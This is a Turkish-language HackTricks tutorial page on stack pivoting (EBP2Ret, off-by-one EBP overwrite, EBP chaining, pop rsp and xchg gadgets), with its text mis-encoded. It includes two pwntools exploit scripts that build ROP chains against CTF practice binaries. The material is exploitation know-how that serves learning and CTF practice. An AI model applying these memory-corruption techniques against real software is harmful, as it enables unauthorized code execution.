# Stack Pivoting - EBP2Ret - EBP chaining

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

Bu teknik, **Base Pointer (EBP)**'yi manipÃ¼le etme yeteneÄŸini kullanarak EBP kaydÄ±nÄ± dikkatli bir ÅŸekilde kullanarak ve `leave; ret` komut dizisinin dikkatli kullanÄ±mÄ±yla birden fazla fonksiyonun yÃ¼rÃ¼tÃ¼lmesini zincirleme ÅŸeklinde sÃ¶mÃ¼rÃ¼r.

HatÄ±rlatma olarak, **`leave`** temelde ÅŸunu ifade eder:
```
movl               %ebp, %esp
popl               %ebp
ret
```
Ve **EBP, EIP'den Ã¶nce stack'te** olduÄŸundan, stack'i kontrol ederek EBP'yi kontrol etmek mÃ¼mkÃ¼ndÃ¼r.

### EBP2Ret

Bu teknik, **EBP kaydÄ±nÄ± deÄŸiÅŸtirebileceÄŸiniz ancak EIP kaydÄ±nÄ± doÄŸrudan deÄŸiÅŸtiremeyeceÄŸiniz durumlarda** Ã¶zellikle yararlÄ±dÄ±r. FonksiyonlarÄ±n Ã§alÄ±ÅŸmayÄ± bitirdiklerindeki davranÄ±ÅŸlarÄ±nÄ± kullanÄ±r.

`fvuln`'Ã¼n yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda, stack'e **sahte bir EBP** enjekte ederek, bu sahte EBP'nin, shellcode'unuzun adresinin bulunduÄŸu bellek alanÄ±na iÅŸaret etmesini saÄŸlarsanÄ±z (pop iÅŸlemi iÃ§in 4 bayt eklenerek), EIP'yi dolaylÄ± olarak kontrol edebilirsiniz. `fvuln` geri dÃ¶ndÃ¼ÄŸÃ¼nde, ESP bu hazÄ±rlanmÄ±ÅŸ konuma ayarlanÄ±r ve ardÄ±ÅŸÄ±k `pop` iÅŸlemi ESP'yi 4 azaltarak etkili bir ÅŸekilde shellcode'unuza iÅŸaret eder. `ret` talimatÄ± yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nde, kontrol shellcode'unuza aktarÄ±lÄ±r.

#### SaldÄ±rÄ± OluÅŸturma

Ã–ncelikle, shellcode'unuzu bir yÃ¼rÃ¼tÃ¼lebilir bellek alanÄ±na **enjekte etmeniz ve adresini almanÄ±z**, veya geÃ§erli bir [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) adresini almanÄ±z veya ESP'yi `system()` adresinin bulunduÄŸu yere ve ardÄ±ndan `"/bin/sh"` adresiyle takip edilen **4 gereksiz bayt** iÃ§eren bir yere iÅŸaret etmeniz gerekir.

Daha sonra, bir dolgu oluÅŸturun ve EBP'yi, `shellcode/one_gadget adresi - 4` ile tehlikeye atÄ±n. Bu `-4` olmalÄ± Ã§Ã¼nkÃ¼ `pop` iÅŸleminden dolayÄ±dÄ±r. Sonra, ESP istediÄŸimiz adrese iÅŸaret ederken ve `ret` yÃ¼rÃ¼tÃ¼lÃ¼rken olacak.

#### Bir Tane YanlÄ±ÅŸlÄ±kla Exploit

Bu tekniÄŸin belirli bir varyantÄ± olan "Bir Tane YanlÄ±ÅŸlÄ±kla Exploit" adÄ±nda Ã¶zel bir varyantÄ± vardÄ±r. Bu, **EBP'nin en az anlamlÄ± baytÄ±nÄ± yalnÄ±zca deÄŸiÅŸtirebildiÄŸinizde** kullanÄ±lÄ±r. Bu durumda, shellcode'un adresini depolayan bellek konumu, EBP ile ilk Ã¼Ã§ baytÄ± paylaÅŸmalÄ±dÄ±r, daha kÄ±sÄ±tlanmÄ±ÅŸ koÅŸullarla benzer bir manipÃ¼lasyona izin verir.

### **EBP Zincirleme**

Bu nedenle, stack'teki `EBP` giriÅŸine kontrol edilen bir adres ve `EIP`'de `leave; ret` adresi yerleÅŸtirilerek, `ESP`'nin stack'teki kontrol edilen `EBP` adresine **taÅŸÄ±nmasÄ± mÃ¼mkÃ¼n olur**.

Åimdi, **`ESP`** istenilen bir adrese iÅŸaret ederken ve bir sonraki talimatÄ±n yÃ¼rÃ¼tÃ¼lmesi bir `RET` olduÄŸunda, bunu kÃ¶tÃ¼ye kullanmak iÃ§in kontrol edilen ESP yerine ÅŸunu yerleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r:

* **`&(sonraki sahte EBP)`** -> `leave` talimatÄ±ndan `pop ebp` ile yeni EBP'yi yÃ¼kleyin
* **`system()`** -> `ret` tarafÄ±ndan Ã§aÄŸrÄ±lÄ±r
* **`&(leave;ret)`** -> sistem bittiÄŸinde Ã§aÄŸrÄ±lÄ±r, ESP'yi sahte EBP'ye taÅŸÄ±r ve tekrar baÅŸlar
* **`&("/bin/sh")`**-> `system` iÃ§in parametre

Temelde bu ÅŸekilde programÄ±n akÄ±ÅŸÄ±nÄ± kontrol etmek iÃ§in birkaÃ§ sahte EBP zincirlenmesi mÃ¼mkÃ¼ndÃ¼r.

AslÄ±nda, bu, [ret2lib](ret2lib/) gibi bir ÅŸeydir, ancak aÃ§Ä±k bir fayda olmaksÄ±zÄ±n daha karmaÅŸÄ±ktÄ±r, ancak bazÄ± sÄ±nÄ±rlÄ± durumlarda ilginÃ§ olabilir.

AyrÄ±ca, burada bu tekniÄŸi bir **stack sÄ±zÄ±ntÄ±sÄ±** ile kullanarak kazanan bir iÅŸlevi Ã§aÄŸÄ±rmak iÃ§in kullanan bir [**zorluk Ã¶rneÄŸi**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) bulunmaktadÄ±r. Bu, sayfadaki final saldÄ±rÄ± yÃ¼kÃ¼dÃ¼r:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## RSP'yi kontrol etmek iÃ§in diÄŸer yollar

### **`pop rsp`** cihazÄ±

[**Bu sayfada**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) bu teknik kullanÄ±larak bir Ã¶rnek bulabilirsiniz. Bu zorluk iÃ§in 2 belirli argÃ¼manla bir iÅŸlevi Ã§aÄŸÄ±rmak gerekiyordu ve bir **`pop rsp` cihazÄ±** bulunuyordu ve bir **yÄ±ÄŸÄ±n sÄ±zÄ±ntÄ±sÄ±** mevcuttu:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp cihazÄ±
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## Referanslar

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi **HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanÄ±z [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'Ä± takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
